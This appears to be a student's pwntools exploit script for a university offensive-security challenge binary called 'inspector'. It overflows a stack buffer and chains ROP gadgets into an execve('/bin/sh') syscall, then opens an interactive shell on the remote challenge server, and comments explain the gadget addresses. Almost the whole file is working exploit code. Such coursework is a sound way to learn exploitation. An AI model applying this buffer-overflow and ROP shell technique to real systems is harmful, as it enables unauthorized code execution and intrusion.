from pwn import *

pop_rdi = p64(0x0040062e) 
binsh = p64(0x00400708) #address pointing to string '/bin/sh' 
pop_rsi = p64(0x00400636)
rsi_val = p64(0x0)
pop_rdx = p64(0x0040063e)
rdx_val = p64(0x0)
pop_rax = p64(0x00400646)
rax_val = p64(0x3b) #decimal 59
system = p64(0x00400625) #call system with rax val
main = p64(0x0040064a) #for continuity of program


payload = 'A'*0x20 + 'B'*0x8 +\
pop_rdi + binsh +\
pop_rsi + rsi_val +\
pop_rdx + rdx_val +\
pop_rax + rax_val +\
system + main + '\n'

gdb_script = '''
b * 0x000000000040066d
b * 0x0000000000400672 
'''

# p = process('./inspector') #for local
p = remote ('offsec-chalbroker.osiris.cyber.nyu.edu', 1342)# for remote

# gdb.attach(p, gdb_script) #for local
p.sendafter('abc123): ', 'tg1799\n') #for remote
p.sendafter('shell!\n', payload)
p.interactive()


# gadget_2 ==> pop rdi; ret [0x0040062e] ("/bin/sh\x00" <-- rsp)
# gadget_3 ==> pop rsi; ret [0x00400636] (0x0 <-- rsp)
# gadget_4 ==> pop rdx; ret [0x0040063e] (0x0 <-- rsp)
# gadget_5 ==> pop rax; ret [0x00400646] (0x59 <-- rsp)
# gadget_1 ==> system       [0x00400625]

#when i give the input 'A'*0x20 + '/bin/sh\x00', \0x7fffffffde50 is the address for the /bin/sh part of the input
#however, although this works locally, the stack addresses on the server will be different so this wont work there
#hence i found the /bin/sh string in the program and hard coded that address because the gadget address will remain the same on the server as well